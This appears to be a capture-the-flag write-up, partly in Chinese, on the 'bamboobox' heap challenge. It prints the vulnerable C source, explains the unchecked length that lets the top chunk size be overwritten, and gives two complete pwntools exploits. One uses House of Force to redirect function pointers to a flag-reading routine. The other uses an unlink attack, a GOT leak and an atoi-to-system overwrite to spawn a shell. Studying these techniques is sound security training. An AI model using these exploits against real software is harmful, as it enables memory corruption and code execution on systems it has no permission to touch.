# house of force

## bamboobox

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
struct item{
	int size ;
	char *name ;
};

struct item itemlist[100] = {0}; 

int num ;

void hello_message(){
	puts("There is a box with magic");
	puts("what do you want to do in the box");
}

void goodbye_message(){
	puts("See you next time");
	puts("Thanks you");
}

struct box{
	void (*hello_message)();
	void (*goodbye_message)();
};

void menu(){
	puts("----------------------------");
	puts("Bamboobox Menu");
	puts("----------------------------");
	puts("1.show the items in the box");
	puts("2.add a new item");
	puts("3.change the item in the box");
	puts("4.remove the item in the box");
	puts("5.exit");
	puts("----------------------------");
	printf("Your choice:");
}


void show_item(){
	int i ;
	if(!num){
		puts("No item in the box");		
	}else{
		for(i = 0 ; i < 100; i++){
			if(itemlist[i].name){
				printf("%d : %s",i,itemlist[i].name);
			}
		}
		puts("");
	}
}

int add_item(){

	char sizebuf[8] ;
	int length ;
	int i ;
	int size ;
	if(num < 100){
		printf("Please enter the length of item name:");
		read(0,sizebuf,8);
		length = atoi(sizebuf);
		if(length == 0){
			puts("invaild length");
			return 0;
		}
		for(i = 0 ; i < 100 ; i++){
			if(!itemlist[i].name){
				itemlist[i].size = length ;
				itemlist[i].name = (char*)malloc(length);
				printf("Please enter the name of item:");
				size = read(0,itemlist[i].name,length);
				itemlist[i].name[size] = '\x00';
				num++;
				break;
			}
		}
	
	}else{
		puts("the box is full");
	}
	return 0;
}



void change_item(){

	char indexbuf[8] ;
	char lengthbuf[8];
	int length ;
	int index ;
	int readsize ;

	if(!num){
		puts("No item in the box");
	}else{
		printf("Please enter the index of item:");
		read(0,indexbuf,8);
		index = atoi(indexbuf);
		if(itemlist[index].name){
			printf("Please enter the length of item name:");
			read(0,lengthbuf,8);
			length = atoi(lengthbuf);
			printf("Please enter the new name of the item:");
			readsize = read(0,itemlist[index].name,length);
			*(itemlist[index].name + readsize) = '\x00';
		}else{
			puts("invaild index");
		}
		
	}	

}

void remove_item(){
	char indexbuf[8] ;
	int index ;

	if(!num){
		puts("No item in the box");
	}else{
		printf("Please enter the index of item:");
		read(0,indexbuf,8);
		index = atoi(indexbuf);
		if(itemlist[index].name){
			free(itemlist[index].name);
			itemlist[index].name = 0 ;
			itemlist[index].size = 0 ;
			puts("remove successful!!");
			num-- ;			
		}else{
			puts("invaild index");
		}
	}
}

void magic(){
	int fd ;
	char buffer[100];
	fd = open("./flag",O_RDONLY);
	read(fd,buffer,sizeof(buffer));
	close(fd);
	printf("%s",buffer);
	exit(0);
}

int main(){
	
	char choicebuf[8];
	int choice;
	struct box *bamboo ;
	setvbuf(stdout,0,2,0);
	setvbuf(stdin,0,2,0);
	bamboo = malloc(sizeof(struct box));
	bamboo->hello_message = hello_message;
	bamboo->goodbye_message = goodbye_message ;
	bamboo->hello_message();

	while(1){
		menu();
		read(0,choicebuf,8);
		choice = atoi(choicebuf);
		switch(choice){
			case 1:
				show_item();
				break;
			case 2:
				add_item();
				break;
			case 3:
				change_item();
				break;
			case 4:
				remove_item();
				break;
			case 5:
				bamboo->goodbye_message();
				exit(0);
				break;
			default:
				puts("invaild choice!!!");
				break;
		
		}	
	}

	return 0 ;
}
```

## 漏洞

没有对 length 进行限制，可以修改到 top chunk 的 size 位。

HOF 利用条件：

1. 需要存在漏洞使得用户能够控制 top chunk 的 size 域。
2. 需要用户能自由控制 malloc 的分配大小
3. 分配的次数不能受限制

## house of force exp

```python
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./bamboobox"
# libc_binary = "./"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
# libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice:",str(idx))

def add(length,content):
    opt(2)
    p.sendlineafter("Please enter the length of item name:",str(length))
    p.sendlineafter("Please enter the name of item:",str(content))

def list():
    opt(1)

def free(idx):
    opt(4)
    p.sendlineafter("Please enter the index of item:",str(idx))

def edit(idx,length,content):
    opt(3)
    p.sendlineafter("Please enter the index of item:",str(idx))
    p.sendlineafter("Please enter the length of item name:",str(length))
    p.sendlineafter("Please enter the new name of the item:",str(content))

add(0x30,"a"*0x10)

payload = flat([
    0,0xffffffffffffffff
    ])

edit(0,0x40,"b"*0x30+payload)
add(-0x70,"aabb") # minus top chunk addr
add(0x20,p64(0x400d49)*2)
p.sendline("5")
# gdb.attach(p,"set $h=0x603000,$g=0x6020c0")

p.interactive()
```

## unlink exp

```python
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./bamboobox"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice:",str(idx))

def add(length,content):
    opt(2)
    p.sendlineafter("Please enter the length of item name:",str(length))
    p.sendlineafter("Please enter the name of item:",str(content))

def list():
    opt(1)

def free(idx):
    opt(4)
    p.sendlineafter("Please enter the index of item:",str(idx))

def edit(idx,length,content):
    opt(3)
    p.sendlineafter("Please enter the index of item:",str(idx))
    p.sendlineafter("Please enter the length of item name:",str(length))
    p.sendlineafter("Please enter the new name of the item:",str(content))

x = 0x6020c8
fake_fd = x-0x18
fake_bk = x-0x10
payload = flat([
    0,0x20,
    fake_fd,fake_bk,
    0x20
    ])
add(0x40-8,payload)
add(0x20-8,"a"*8)
add(0x90-8,"a"*8)
payload = flat([
    0,0,
    0x50,0x90
    ])
edit(1,0x40,payload)
free(2)

payload = flat([
    0,0,0,
    elf.got["atoi"]
    ])

edit(0,0x20,payload)
list()
p.recvuntil("0 : ")
atoi_addr = u64(p.recv(6).ljust(8,"\0"))
system_addr = atoi_addr - libc.sym["atoi"] + libc.sym["system"]
log.success("system_addr is -> "+ hex( system_addr ))

edit(0,8,p64(system_addr))
p.sendline("/bin/sh\x00")
# gdb.attach(p,"set $h=0x603000,$g=0x6020c0")

p.interactive()
```
